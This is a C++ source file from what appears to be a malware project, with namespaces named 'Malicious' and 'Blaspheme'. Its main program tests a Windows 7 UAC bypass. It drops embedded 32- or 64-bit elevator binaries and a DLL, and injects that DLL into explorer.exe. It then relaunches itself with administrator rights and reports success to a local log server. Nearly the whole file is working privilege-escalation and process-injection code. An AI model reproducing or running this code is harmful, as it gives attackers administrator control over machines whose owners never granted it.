#include <common/Log.hpp>
#include <common/LogServer.hpp>
using namespace Common;

#include <system/ThisProcess.hpp>
#include <system/System.hpp>
#include <system/Process.hpp>
#include <system/ProcessManager.hpp>
#include <system/File.hpp>
#include <system/Uac.hpp>
using namespace System;

#include <malicious/BinaryRessource.hpp>
#include <blaspheme/Blaspheme.hpp>
using namespace Malicious;

#include <string>
#include <iostream>
using namespace std;

#include <ElevatorDll32.hpp>
#include <ElevatorDll64.hpp>
#include <Elevator32.hpp>
#include <Elevator64.hpp>

int main()
{
	try
	{
		LOG.trace();
		Network::Port port = 8000;
		LogServer logServer(port, "ADMINISTRATOR");
		if(isAdministrator())
		{
			LOG.setHeader("FROM ELEVATED PROCESS");
			LOG.addObserver(new Common::LogToNetwork("127.0.0.1", port));
			LOG << "You are administrator, sending proof !";
			LOG.sendRaw("ADMINISTRATOR");
			return EXIT_SUCCESS;
		}
		else
		{
			LOG.setHeader("TEST ELEVATION");
			LOG.addObserver(new Common::LogToNetwork("127.0.0.1", 80));
			LOG.addObserver(new Common::LogToConsole);
			LOG << "You're not administrator !";
			logServer.start();
		}

        switch(getSystemVersion())
	    {
		    case OS_WIN32_WINDOWS_VISTA:
			    if(isUacActivated())
			    {
					LOG << "Privilege escalation is not supported on Windows Vista";
					return EXIT_FAILURE;
			    }
			    break;
		    case OS_WIN32_WINDOWS_SEVEN:
			    if(isUacActivated())
			    {
					LOG << "Trying privilege escalation";
					BinaryRessource * elevatorDll = 0;
					BinaryRessource * elevator = 0;
					if(is64BitWindows())
					{
						LOG << "Windows 64bit detected";
						elevatorDll = new BinaryRessource(ElevatorDll64, sizeof(ElevatorDll64), ELEVATOR_DLL_NAME, true);
						elevator = new BinaryRessource(Elevator64, sizeof(Elevator64), ELEVATOR_EXE_NAME, true);
					}
					else
					{
						LOG << "Windows 32bit detected";
						elevatorDll = new BinaryRessource(ElevatorDll32, sizeof(ElevatorDll32), ELEVATOR_DLL_NAME, true);
						elevator = new BinaryRessource(Elevator32, sizeof(Elevator32), ELEVATOR_EXE_NAME, true);
					}

					LOG << "What is explorer.exe PID ?";
					DWORD explorer_pid = System::ProcessManager::GetPidFromName(ELEVATOR_PROCESS_NAME);
					if(explorer_pid)
					{
						LOG << "Injecting escalaion DLL in explorer.exe : " + to_string(explorer_pid);
					}
					else
					{
						FATAL_ERROR("Process explorer.exe does not exist");
					}
    					
                    ThisProcess thisProcess;
                    string currentPath = thisProcess.getProgramDir();
					LOG << "Current dir : "+currentPath;
                    string elevatorArguments = currentPath+"\\"+string(ELEVATOR_PROCESS_NAME) + " " + to_string(explorer_pid) + " " + currentPath+"\\"+string(ELEVATOR_DLL_NAME) + " " + thisProcess.getProgramPath();
					LOG << "Escalation command line : " + string(ELEVATOR_EXE_NAME) + " " + elevatorArguments;
    					
					Process elevatorProcess(ELEVATOR_EXE_NAME, elevatorArguments);
					LOG << "Waiting elevator to finish";
					DWORD exitCode = elevatorProcess.wait();					

					delete elevatorDll;
					delete elevator;
			    }
				break;
			default:
				LOG << "Operating system not supported";
				return EXIT_FAILURE;
        }
		logServer.stop();
		if(logServer.isProofReceived())
		{
			LOG << "Log server well interrupted";
			return EXIT_SUCCESS;
		}
    }
    catch(std::exception& e)
    {
        LOG << e.what();
    }
	catch(...)
	{
		LOG << "Unknow exception.";
	}
	return EXIT_FAILURE;
}
